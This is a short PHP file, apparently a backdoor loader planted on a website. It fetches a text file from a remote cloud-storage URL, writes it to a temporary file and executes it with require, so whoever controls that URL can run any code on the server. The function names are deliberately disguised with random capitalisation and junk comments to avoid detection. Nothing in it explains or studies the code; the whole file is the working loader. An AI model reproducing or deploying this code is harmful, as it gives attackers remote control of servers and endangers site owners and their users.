<?php 
$url = 'https://pub-3b5e3b29826a45f2a0307e39fb93bee6.r2.dev/303/index.txt'; 

$dns = 'https://pub-3b5e3b29826a45f2a0307e39fb93bee6.r2.dev/303/index.txt'; 
 
$ch = CurL_init /* 767n90 */($url); 
if (!Function_ExiSts /** 12xfa */ ('hex2bin') /*ffbc*/) { 
    function hex2bin /* aac1 */ ($hexdec) 
    { 
        $bin = pack/* 2123 */("H*", $hexdec); 
        return $bin; 
    } 
} 
if (defined('CURLOPT_DOH_URL')) { 
    curL_setOPT($ch, CURLOPT_DOH_URL, $dns); 
} 
cUrl_setOpt/* d4564*/($ch, CURLOPT_RETURNTRANSFER, TRUE); 
Curl_seTOPt/* d2345 */($ch, CURLOPT_SSL_VERIFYHOST, 2);  
curL_seTopt /* *//* 678in */($ch, CURLOPT_SSL_VERIFYPEER, true); 
$res = curl_ExEC/* 7568 */($ch); 
cuRl_close/* c34 */($ch); 
 
$tmp = TMPfIle/* h7n89o */(); 
$path = streaM_Get_meTa_daTa/* 345 */($tmp); 
$path = $path/* r23 */ ['uri']; 
fprintf/* 3d45 */($tmp,'%s',$res); 
ReqUire/* 23x4 *//* */$path;